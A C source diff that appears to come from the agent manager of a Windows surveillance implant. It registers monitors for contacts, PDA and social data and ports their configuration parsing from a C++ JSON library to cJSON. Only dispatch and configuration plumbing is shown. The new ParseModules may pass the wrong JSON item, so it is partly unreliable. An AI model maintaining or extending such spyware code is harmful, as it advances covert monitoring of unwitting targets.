@@ -1,10 +1,11 @@
 #include <windows.h>
+#include <stdio.h>
 #include <config.h>
 #include "common.h"
 #include "H4-DLL.h"
 #include "AM_Core.h"
 #include "LOG.h"
-#include <json/json.h>
+#include <cJSON/cJSON.h>
 #include "bss.h"
 
 // XXX Definita in HM_IpcModule!!!!
@@ -53,20 +54,20 @@ extern void PM_PDAAgentRegister();
 extern void PM_ContactsRegister();
 extern void PM_SocialAgentRegister();
 
-typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
-extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
+typedef void (WINAPI *conf_callback_t)(cJSON*, DWORD counter);
+extern BOOL HM_ParseConfSection(char *conf, const char *section, conf_callback_t call_back);
 void AM_SuspendRestart(DWORD);
 
 typedef DWORD (WINAPI *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
 typedef DWORD (WINAPI *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
-typedef DWORD (WINAPI *PMI_Generic_t) (JSONObject); // Prototipo per l'Init
+typedef DWORD (WINAPI *PMI_Generic_t) (cJSON*); // Prototipo per l'Init
 typedef DWORD (WINAPI *PMU_Generic_t) (void); // Prototipo per l'UnRegister
 
 #define AM_MAXDISPATCH 50
 #define AGENT_NAME_LENGTH 32
 
 typedef struct _amdispatch {
-	WCHAR agent_name[AGENT_NAME_LENGTH];
+	CHAR agent_name[AGENT_NAME_LENGTH];
 	DWORD agent_tag;
 	PMD_Generic_t pDispatch; 
 	PMS_Generic_t pStartStop; 
@@ -97,10 +98,10 @@ static LPAMDISPATCH GetDispatchByTag(DWORD dwTag)
 	return NULL;
 }
 
-static LPAMDISPATCH GetDispatchByName(LPCWSTR lpName)
+static LPAMDISPATCH GetDispatchByName(LPCSTR lpName)
 {
 	for (DWORD i = 0; i < dwDispatchCnt; i++) {
-		if (!wcsicmp(lpName, aDispatchArray[i].agent_name))
+		if (!stricmp(lpName, aDispatchArray[i].agent_name))
 			return &aDispatchArray[i];
 	}
 
@@ -279,13 +280,13 @@ void AM_IPCAgentStartStop(DWORD dwTag, BOOL bStartFlag)
 
 // Registra il Monitor con le funzioni di Init, StartStop e Dispatch
 // Viene richiamata dalle funzioni di registrazione dei monitor.
-DWORD AM_MonitorRegister(const WCHAR *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
+DWORD AM_MonitorRegister(const CHAR *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
 {
 	LPAMDISPATCH dispatchArray = AllocateDispatchElement();
 	if (dispatchArray == NULL) {
 		return 0;
 	}
-	swprintf_s(dispatchArray->agent_name, AGENT_NAME_LENGTH, L"%s", agent_name);
+	sprintf_s(dispatchArray->agent_name, AGENT_NAME_LENGTH, "%s", agent_name);
 	dispatchArray->agent_tag = agent_tag;
 	dispatchArray->pDispatch = (PMD_Generic_t) pDispatch;
 	dispatchArray->pStartStop = (PMS_Generic_t) pStartStop;
@@ -325,7 +326,7 @@ DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
 }
 
 // Prende il tag di un agente per nome
-DWORD AM_GetAgentTag(const WCHAR *agent_name)
+DWORD AM_GetAgentTag(const CHAR *agent_name)
 {
 	LPAMDISPATCH dispatch = GetDispatchByName(agent_name);
 	if (dispatch != NULL)
@@ -335,7 +336,7 @@ DWORD AM_GetAgentTag(const WCHAR *agent_name)
 }
 
 // Esegue l'init di un monitor
-DWORD AM_MonitorInit(DWORD dwTag, JSONObject elem)
+DWORD AM_MonitorInit(DWORD dwTag, cJSON* elem)
 {
 	LPAMDISPATCH dispatch = GetDispatchByTag(dwTag);
 	if (dispatch == NULL)
@@ -489,19 +490,20 @@ DWORD AM_Startup()
 
 
 // Legge la configurazione degli agent da file
-void WINAPI ParseModules(JSONObject module, DWORD dummy)
+void WINAPI ParseModules(cJSON *root, DWORD dummy)
 {
-	AM_MonitorInit(AM_GetAgentTag(module[L"module"]->AsString().c_str()), module);	
+	cJSON* module = cJSON_GetObjectItem(root, "module");
+	const char* value = cJSON_GetStringValue(module);
+	AM_MonitorInit(AM_GetAgentTag(value), module);	
 }
 
 void UpdateAgentConf()
 {
-	JSONObject dummy;
 	char *conf_json = HM_ReadClearConf(shared.H4_CONF_FILE);
 	if (conf_json) {
-		HM_ParseConfSection(conf_json, L"modules", &ParseModules);
+		HM_ParseConfSection(conf_json, "modules", &ParseModules);
 		// Inizializza l'agente "fantasma" social
-		AM_MonitorInit(AM_GetAgentTag(L"social"), dummy);
+		AM_MonitorInit(AM_GetAgentTag("social"), NULL);
 	}
 	SAFE_FREE(conf_json);
 }
